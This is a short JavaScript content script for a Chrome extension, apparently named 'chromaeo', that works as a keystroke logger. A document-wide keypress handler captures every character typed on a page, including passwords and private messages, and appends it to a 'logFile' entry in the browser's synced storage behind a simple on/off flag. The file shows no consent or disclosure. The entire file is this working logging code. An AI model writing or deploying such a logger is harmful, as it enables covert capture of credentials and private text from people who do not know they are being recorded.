var stringToWrite = "";
var isEnabled = true;

function writeStringToStorage(s) {
	
	chrome.storage.sync.get("logFile", function(items) {
		
	    if (!chrome.runtime.error) {
			
			var oldString;
			
			if (items.logFile)
				oldString = items.logFile;
			else
				oldString = "";
			
			var newString = oldString + s;
			chrome.storage.sync.set({"logFile": newString});
	    }
	});
		
	chrome.storage.sync.get("logFile", function(items) {
	    if (!chrome.runtime.error) {
	    	console.log(items.logFile);
	    }
	});
	
}

document.onkeypress = function(evt) {
	
	if (!isEnabled)
		return;
	
	// Get the key
	evt = evt || window.event;
	var charCode = evt.keyCode || evt.which;
	var charStr = String.fromCharCode(charCode);

	// Prepare to write
	stringToWrite += charStr;
	
	// Write to chrome.storage
	writeStringToStorage(stringToWrite);
	stringToWrite = "";
}

function updateEnabled() {
	chrome.storage.sync.get("chromaeoIsEnabled", function(items) {
		if (items.chromaeoIsEnabled) {
			isEnabled = true;
			
		}
		else {
			isEnabled = false;
		}
	});
}

window.onload = function() {
	updateEnabled();
	//writeStringToStorage("<br>");
	
}

chrome.runtime.onMessage.addListener( function(request, sender, sendResponse) {
    if( request.message === "enabledChanged" ) {
    	updateEnabled();
    }
});
